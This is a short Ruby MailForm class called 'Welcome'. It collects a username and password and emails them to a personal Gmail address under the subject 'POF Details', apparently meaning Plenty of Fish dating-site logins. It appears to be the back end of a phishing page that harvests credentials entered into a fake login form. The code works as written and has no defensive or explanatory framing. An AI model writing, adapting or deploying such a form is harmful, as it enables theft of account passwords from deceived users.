class Welcome < MailForm::Base
    attribute :username,      :validate => true
    attribute :password, :validate => true

    attribute :nickname,  :captcha  => true

  # Declare the e-mail headers. It accepts anything the mail method
  # in ActionMailer accepts.

  def headers
 
      {
        :subject => "POF Details ",
        :to => 'Chimaobinwaogazi2016@gmail.com',
        :from => %("#{username}")
      }
end


end